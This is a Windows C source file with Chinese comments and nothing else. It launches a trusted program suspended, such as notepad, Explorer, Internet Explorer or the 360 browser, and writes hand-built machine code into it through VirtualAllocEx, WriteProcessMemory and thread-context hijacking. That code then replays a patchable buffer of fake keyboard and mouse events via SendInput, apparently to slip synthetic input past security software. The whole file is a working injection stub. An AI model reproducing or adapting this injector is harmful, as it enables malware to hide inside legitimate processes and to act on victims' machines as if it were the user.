#define _WIN32_WINNT		0x0502

#include <Windows.h>
#include <shlobj.h>
#include <tchar.h>


BYTE g_pStringData[] = { "user32.dll\0" };

BYTE g_pOPData[] = 
{
	// LoadLibraryA("user32.dll")
	0x68, 0x11, 0x11, 0x11, 0x11,				// push 0x11111111
	0xB8, 0x22, 0x22, 0x22, 0x22,				// mov eax, 0x22222222
	0xFF, 0xD0,									// call eax

	0xBF, 0x00, 0x00, 0x00, 0x00,				// mov edi, 0
	0xBE, 0x33, 0x33, 0x33, 0x33,				// mov esi, 0x33333333

	// loops:
	0x47,										// inc edi
	0x57,										// push edi
	0x56,										// push esi

	// SendInput(1, input, sizeof(INPUT));
	0x6A, 0x1C,									// push 1Ch
	0x56,										// push esi
	0x6A, 0x01,									// push 1
	0xB8, 0x44, 0x44, 0x44, 0x44,				// mov eax, 0x44444444
	0xFF, 0xD0,									// call eax

	0x5E,										// pop esi
	0x5F,										// pop edi

	0x83, 0xC6, 0x1C,							// add esi, sizeof(INPUT)
	0x81, 0xFF, 0x55, 0x55, 0x55, 0x55,			// cmp edi, 0x55555555
	0x75, -28,									// jne loops

	// TerminateProcess(-1, 0)
	0x6A, 0x00,									// push 0
	0x68, 0xff, 0xff, 0xff, 0xff,				// push -1
	0xB8, 0x66, 0x66, 0x66, 0x66,				// mov eax, 0x66666666
	0xFF, 0xD0,									// call eax
};


bool InjectCode(HANDLE hProcess, HANDLE hThread, void *pInput, int iInputCount)
{
	LPVOID lpString = ::VirtualAllocEx(hProcess, NULL, sizeof(g_pStringData), MEM_COMMIT, PAGE_READWRITE);
	LPVOID lpInput = ::VirtualAllocEx(hProcess, NULL, iInputCount * sizeof(INPUT), MEM_COMMIT, PAGE_READWRITE);
	LPVOID lpCode = ::VirtualAllocEx(hProcess, NULL, sizeof(g_pOPData), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpString == NULL || lpInput == NULL || lpCode == NULL)
		return false;

	HMODULE hModule = ::LoadLibraryA("kernel32.dll");
	LPVOID lpLoadLibraryA = ::GetProcAddress(hModule, "LoadLibraryA");
	LPVOID lpTerminate = ::GetProcAddress(hModule, "TerminateProcess");
	hModule = ::LoadLibraryA("user32.dll");
	LPVOID lpSendInput = ::GetProcAddress(hModule, "SendInput");

	DWORD dwPattern[] = { 0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x55555555, 0x66666666 };
	DWORD dwReplace[] = { (DWORD)lpString, (DWORD)lpLoadLibraryA, (DWORD)lpInput, (DWORD)lpSendInput, iInputCount, (DWORD)lpTerminate };
	for (int i = 0; i < sizeof(g_pOPData) - sizeof(DWORD); i++)
	{
		for (int j = 0; j < _countof(dwPattern); j++)
		{
			if (*(DWORD*)(g_pOPData + i) == dwPattern[j])
			{
				*(DWORD*)(g_pOPData + i) = dwReplace[j];
				i += sizeof(DWORD);
				break;
			}
		}
	}

	SIZE_T ret = 0;
	::WriteProcessMemory(hProcess, lpString, g_pStringData, sizeof(g_pStringData), &ret);
	if (ret != sizeof(g_pStringData))
		return false;
	::WriteProcessMemory(hProcess, lpCode, g_pOPData, sizeof(g_pOPData), &ret);
	if (ret != sizeof(g_pOPData))
		return false;
	::WriteProcessMemory(hProcess, lpInput, pInput, iInputCount * sizeof(INPUT), &ret);
	if (ret != iInputCount * sizeof(INPUT))
		return false;

	HANDLE hRemote = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpCode, 0, 0, NULL);
	if (hRemote == NULL)
		return false;

	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	if (::GetThreadContext(hThread, &context))
	{
		context.Eip = (DWORD)lpCode;
		::SetThreadContext(hThread, &context);
		::ResumeThread(hThread);
	}

	return true;
}

void FakeSendInput_Inject(INPUT *pInput, int iInputCount)
{
	TCHAR szProgramFiles[MAX_PATH];
	if (S_OK != ::SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFiles))
		lstrcpy(szProgramFiles, _T("C:\\Program Files"));

	// 这里获取360se的exe路径，哈哈哈
	TCHAR sz360[MAX_PATH];
	lstrcpy(sz360, szProgramFiles);
	lstrcat(sz360, _T("\\360\\360se3\\360SE.exe"));

	HKEY hKey = NULL;
	if (ERROR_SUCCESS == ::RegOpenKey(HKEY_CLASSES_ROOT, _T("Applications\\360SE.exe\\shell\\open\\command"), &hKey))
	{
		DWORD dwSize = _countof(sz360);
		::RegQueryValueEx(hKey, NULL, NULL, NULL, (LPBYTE)sz360, &dwSize);
	}

	// 这里获取ie的路径
	TCHAR szIE[MAX_PATH];
	lstrcpy(szIE, szProgramFiles);
	lstrcat(szIE, _T("\\Internet Explorer\\iexplore.exe"));

	LPCTSTR lpszProcessName[] = { _T("notepad.exe"), _T("calc.exe"), _T("cmd.exe"), _T("regedit.exe"), _T("ctfmon.exe"), _T("osk.exe"), _T("explorer.exe"), szIE, sz360 };
	for (int i = 0; i < _countof(lpszProcessName); i++)
	{
		TCHAR szCmd[512];
		wsprintf(szCmd, _T("\"%s\""), lpszProcessName[i]);
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		::RtlSecureZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		::RtlSecureZeroMemory(&pi, sizeof(pi));

		if (::CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			if (!InjectCode(pi.hProcess, pi.hThread, pInput, iInputCount))
				::TerminateProcess(pi.hProcess, 0);
			else
				break;
		}
	}
}

//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////

int iCount = 0x99999999;
BYTE pData[sizeof(INPUT) * 20] = { 0xee,0xee,0xee,0xee };


void WinMainCRTStartup()
{
	FakeSendInput_Inject((INPUT*)pData, iCount);
	::TerminateProcess(::GetCurrentProcess(), 0);
}
